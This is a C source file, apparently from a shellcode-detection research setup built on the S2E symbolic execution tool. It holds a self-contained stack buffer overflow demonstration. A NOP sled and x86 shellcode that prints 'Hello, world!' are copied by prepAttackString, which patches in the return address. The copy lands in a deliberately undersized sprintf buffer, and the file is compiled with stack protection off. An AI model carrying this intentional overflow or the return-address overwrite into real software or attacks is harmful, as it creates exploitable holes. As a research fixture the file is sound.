#ifndef _hw_c
#define _hw_c
// gcc -Wall -g -m32 -o hw.elf -fno-stack-protector -z execstack hw.c
// cp hw.elf ../ByteArrays/.

#include <stdio.h>
//#include <unistd.h>
#include <stdlib.h>
#include <string.h>

#ifdef SYMB
#include "/home/s2e/s2e/dasos/s2e/s2e/guest/include/s2e.h" // modified s2e.h
#endif

char hello[] = 
	            "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"      // 128
	            "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"      // 112
	            "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"      //  96
	            "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"      //  80
	            "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"      //  64
               "\x90\x90\xeb\x13\x59\x31\xc0\xb0\x04\x31\xdb\x43\x31\xd2\xb2\x0f"      //  48
               "\xcd\x80\xb0\x01\x4b\xcd\x80\xe8\xe8\xff\xff\xff\x48\x65\x6c\x6c"      //  32
               "\x6f\x2c\x20\x77\x6f\x72\x6c\x64\x21\x0a\x0d\xaa\xbb\xcc\xdd\x00";     //  16


/*int main () {
   printf ("Hello, world!\n");
   return 0;
}*/

void logMsg (char* msg);
void prepAttackString (char* s, void* ptr);


int main () {
	char msg[128]; // this is the buffer that will be executed
	prepAttackString (hello, (void *) msg);
	 // series of single byte nops {nop, push eax, pop eax, nop} to help speed experiments
   __asm__ __volatile__( ".byte 0x90, 0x50, 0x58, 0x90\n" );
	#ifdef SYMB
	s2e_codext_init_lua ();
	#endif
	memset (msg, '\0', 128);
	// send retaddr val to speed experiments
	/* while read external input into msg */ strcpy (msg, hello); 
		logMsg (msg);
		memset (msg, '\0', 128);
		// send response
	/* end while */
   return 0;
} // end main


void logMsg (char* msg) {
	char log_str[119]; // this is the buffer that will be overflowed, buf[(strlen (hello) - 9)]
	sprintf (log_str, "Msg in: %s", msg); // make fprintf to mimic ghttpd
	return;
} // end fn logString


void prepAttackString (char* s, void* ptr) {
	// put the address of the attack str into the end of the attack str
	unsigned len = strlen (s);
	// note *s can not have any nulls
	printf ("Attack string at 0x%08x:", (unsigned int) s);
	memcpy (&(s[len - 4]), (char *) (&ptr), 4);
	/*unsigned i;
	for (i = 0; i < len; i++) {
		if (i % 16 == 0) { printf ("\n"); }
		printf (" 0x%02x", s[i] & 0xff);
		if ((s[i] & 0xff) == 0x00) { printf ("Warning, attack string has null byte.\n"); }
	}
	printf ("\n");
	printf ("\n");*/
	return;
} // end fn prepAttackString

#endif
